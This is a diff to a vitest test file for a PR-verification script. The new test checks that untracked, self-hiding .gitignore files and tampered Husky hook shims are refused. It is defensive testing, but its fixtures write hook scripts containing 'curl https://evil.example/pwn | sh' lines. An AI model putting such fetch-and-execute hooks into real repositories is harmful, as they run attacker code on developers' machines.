@@ -25,7 +25,6 @@ import { tmpdir } from 'node:os';
 import { basename, dirname, join } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { afterEach, describe, expect, it, vi } from 'vitest';
-import { arePermissionBitsEnforced } from '@qwen-code/qwen-code-core/test-utils/permission-bits.js';
 import { executionApprovalErrors } from '../../scripts/verify-pr-check.mjs';
 import {
   FORCE_HARDWARE_ENV,
@@ -43,8 +42,52 @@ import {
   parseRepo,
   requireBoundary,
   reviewState,
+  untrackedIgnoreSourceError,
   validateContext,
 } from '../../scripts/verify-pr-prepare.mjs';
+
+// Local permission-bit probe so this file never imports built @qwen-code/qwen-code-core/dist
+// (the java_only CI lane runs scripts/tests matching managed-agent-server/ with build skipped).
+function arePermissionBitsEnforced() {
+  if (process.platform === 'win32') return false;
+  let probeDir;
+  try {
+    probeDir = mkdtempSync(join(tmpdir(), 'qwen-permission-probe-'));
+    chmodSync(probeDir, 0o000);
+    const readBlocked = (() => {
+      try {
+        readdirSync(probeDir);
+        return false;
+      } catch (error) {
+        return error?.code === 'EACCES';
+      }
+    })();
+    const writeBlocked = (() => {
+      try {
+        writeFileSync(join(probeDir, 'probe'), '');
+        return false;
+      } catch (error) {
+        return error?.code === 'EACCES';
+      }
+    })();
+    return readBlocked && writeBlocked;
+  } catch {
+    return false;
+  } finally {
+    if (probeDir) {
+      try {
+        chmodSync(probeDir, 0o700);
+      } catch {
+        // best effort
+      }
+      try {
+        rmSync(probeDir, { recursive: true, force: true });
+      } catch {
+        // best effort
+      }
+    }
+  }
+}
 
 const SCRIPT = fileURLToPath(
   new URL('../../scripts/verify-pr-prepare.mjs', import.meta.url),
@@ -5273,5 +5316,177 @@ describe('trust classification and mandatory escalation (§4)', () => {
     expect(tcExec.escalationReasons).toContain(
       'symlink-or-submodule:vendor/sub',
     );
+  });
+
+  it('R6-2: refuses an untracked self-hiding root or nested .gitignore while allowing tracked .gitignore directories', () => {
+    const { dir, head } = makeRepo();
+    writeFileSync(join(dir, '.gitignore'), 'node_modules/\ntmp/\n');
+    execFileSync('git', ['add', '.gitignore'], { cwd: dir, env: gitEnv });
+    execFileSync('git', ['commit', '-qm', 'track root gitignore'], {
+      cwd: dir,
+      env: gitEnv,
+    });
+    const trackedHead = execFileSync('git', ['rev-parse', 'HEAD'], {
+      cwd: dir,
+      env: gitEnv,
+      encoding: 'utf8',
+    }).trim();
+
+    // Legitimate ignored directories (including third-party .gitignore under node_modules) stay clean.
+    mkdirSync(join(dir, 'node_modules', 'pkg'), { recursive: true });
+    writeFileSync(join(dir, 'node_modules', 'pkg', '.gitignore'), '*\n');
+    mkdirSync(join(dir, 'tmp'), { recursive: true });
+    writeFileSync(join(dir, 'tmp', 'artifact.log'), 'ok\n');
+    expect(untrackedIgnoreSourceError(dir)).toBeNull();
+
+    // Untracked nested self-hiding .gitignore hides files from git status and must be refused.
+    mkdirSync(join(dir, 'sub'), { recursive: true });
+    writeFileSync(join(dir, 'sub', '.gitignore'), '*\n');
+    writeFileSync(join(dir, 'sub', 'hidden.txt'), 'secret\n');
+    const nestedErr = untrackedIgnoreSourceError(dir);
+    expect(nestedErr).toMatch(/untracked ignore files hide worktree entries/);
+    expect(nestedErr).toContain('sub/.gitignore');
+
+    // End-to-end prepare CLI must also refuse the clone with exit 3.
+    const fakeDir = mkdtempSync(join(tmpdir(), 'verify-pr-prepare-r62-'));
+    tmpDirs.push(fakeDir);
+    const snapFile = join(fakeDir, 'pr.json');
+    writeFileSync(
+      snapFile,
+      JSON.stringify({
+        number: 101,
+        title: 'R6-2 untracked gitignore test',
+        headRefOid: trackedHead,
+        baseRefOid: head,
+        headRefName: 'feat/r62',
+        baseRefName: 'main',
+        isCrossRepository: false,
+        author: { login: 'octocat' },
+        headRepository: { name: 'qwen-code' },
+        headRepositoryOwner: { login: 'QwenLM' },
+      }),
+    );
+    const fakeBin = join(fakeDir, 'bin');
+    mkdirSync(fakeBin, { recursive: true });
+    writeFileSync(
+      join(fakeBin, 'gh'),
+      [
+        '#!/bin/sh',
+        'if [ "$1" = pr ] && [ "$2" = view ]; then cat "$FAKE_SNAP"; exit 0; fi',
+        'if [ "$1" = api ] && [ "$2" = user ]; then printf \'{"login":"octocat"}\\n\'; exit 0; fi',
+        'if [ "$1" = api ] && [ "$2" = graphql ]; then printf \'{"data":{"repository":{"pullRequest":{"reviewThreads":{"nodes":[],"pageInfo":{"hasNextPage":false,"endCursor":null}},"reviews":{"nodes":[],"pageInfo":{"hasNextPage":false,"endCursor":null}}}}}}\\n\'; exit 0; fi',
+        'printf \'{"permission":"admin"}\\n\'',
+        '',
+      ].join('\n'),
+      { mode: 0o755 },
+    );
+    const envWithGh = {
+      ...process.env,
+      ...gitEnv,
+      FAKE_SNAP: snapFile,
+      PATH: `${fakeBin}:${process.env.PATH ?? ''}`,
+    };
+    const rNested = runPrepare(
+      dir,
+      ['101', '--repo', REPO, '--local-owner'],
+      envWithGh,
+    );
+    expect(rNested.status).toBe(3);
+    expect(rNested.stderr).toContain('sub/.gitignore');
+    expect(rNested.stderr).toContain('git clean -xfd');
+
+    // Leading `:` pathspec-magic directories (`:tmp/`, `:(top)foo/`) cannot spoof tracked `.gitignore`.
+    rmSync(join(dir, 'sub'), { recursive: true, force: true });
+    mkdirSync(join(dir, ':tmp'), { recursive: true });
+    writeFileSync(join(dir, ':tmp', '.gitignore'), '*\n');
+    writeFileSync(join(dir, ':tmp', 'evil.js'), 'pwn\n');
+    const colonTmpErr = untrackedIgnoreSourceError(dir);
+    expect(colonTmpErr).toMatch(/untracked ignore files hide worktree entries/);
+    expect(colonTmpErr).toContain(':tmp/.gitignore');
+    rmSync(join(dir, ':tmp'), { recursive: true, force: true });
+
+    mkdirSync(join(dir, ':(top)foo'), { recursive: true });
+    writeFileSync(join(dir, ':(top)foo', '.gitignore'), '*\n');
+    writeFileSync(join(dir, ':(top)foo', 'evil.js'), 'pwn\n');
+    const colonTopErr = untrackedIgnoreSourceError(dir);
+    expect(colonTopErr).toMatch(/untracked ignore files hide worktree entries/);
+    expect(colonTopErr).toContain(':(top)foo/.gitignore');
+    rmSync(join(dir, ':(top)foo'), { recursive: true, force: true });
+
+    // Husky v9's generated `.husky/_/` shim directory is allowed when `.husky/` is tracked and clean,
+    // but any extra file or modified hook shim inside `.husky/_/` is refused.
+    mkdirSync(join(dir, '.husky', '_'), { recursive: true });
+    writeFileSync(join(dir, '.husky', 'pre-commit'), 'npm run lint\n');
+    execFileSync('git', ['add', '.husky/pre-commit'], {
+      cwd: dir,
+      env: gitEnv,
+    });
+    execFileSync('git', ['commit', '-qm', 'track husky hook'], {
+      cwd: dir,
+      env: gitEnv,
+    });
+    writeFileSync(join(dir, '.husky', '_', '.gitignore'), '*\n');
+    writeFileSync(
+      join(dir, '.husky', '_', 'pre-commit'),
+      '#!/usr/bin/env sh\n. "$(dirname "$0")/h"\n',
+    );
+    writeFileSync(
+      join(dir, '.husky', '_', 'h'),
+      readFileSync(
+        fileURLToPath(
+          new URL('../../node_modules/husky/husky', import.meta.url),
+        ),
+        'utf8',
+      ),
+    );
+    expect(untrackedIgnoreSourceError(dir)).toBeNull();
+
+    writeFileSync(join(dir, '.husky', '_', 'evil.js'), 'pwn\n');
+    expect(untrackedIgnoreSourceError(dir)).toContain('.husky/_/.gitignore');
+    rmSync(join(dir, '.husky', '_', 'evil.js'));
+    writeFileSync(
+      join(dir, '.husky', '_', 'pre-commit'),
+      '#!/usr/bin/env sh\necho pwned\n',
+    );
+    expect(untrackedIgnoreSourceError(dir)).toContain('.husky/_/.gitignore');
+    writeFileSync(
+      join(dir, '.husky', '_', 'pre-commit'),
+      '#!/usr/bin/env sh\n. "$(dirname "$0")/h"\n',
+    );
+    writeFileSync(
+      join(dir, '.husky', '_', 'h'),
+      '#!/usr/bin/env sh\ncurl https://evil.example/pwn | sh\n',
+    );
+    expect(untrackedIgnoreSourceError(dir)).toContain('.husky/_/.gitignore');
+    writeFileSync(
+      join(dir, '.husky', '_', 'h'),
+      readFileSync(
+        fileURLToPath(
+          new URL('../../node_modules/husky/husky', import.meta.url),
+        ),
+        'utf8',
+      ),
+    );
+    writeFileSync(
+      join(dir, '.husky', '_', 'husky.sh'),
+      '#!/usr/bin/env sh\ncurl https://evil.example/pwn2 | sh\n',
+    );
+    expect(untrackedIgnoreSourceError(dir)).toContain('.husky/_/.gitignore');
+
+    // Root untracked self-hiding .gitignore in a repo without a tracked .gitignore must also be refused.
+    const { dir: dir2 } = makeRepo();
+    execFileSync('git', ['rm', '-qf', '.gitignore'], {
+      cwd: dir2,
+      env: gitEnv,
+    });
+    execFileSync('git', ['commit', '-qm', 'remove tracked gitignore'], {
+      cwd: dir2,
+      env: gitEnv,
+    });
+    writeFileSync(join(dir2, '.gitignore'), '*\n');
+    writeFileSync(join(dir2, 'hidden-a.txt'), 'secret\n');
+    const rootErr = untrackedIgnoreSourceError(dir2);
+    expect(rootErr).toMatch(/untracked ignore files hide worktree entries/);
+    expect(rootErr).toContain('.gitignore');
   });
 });
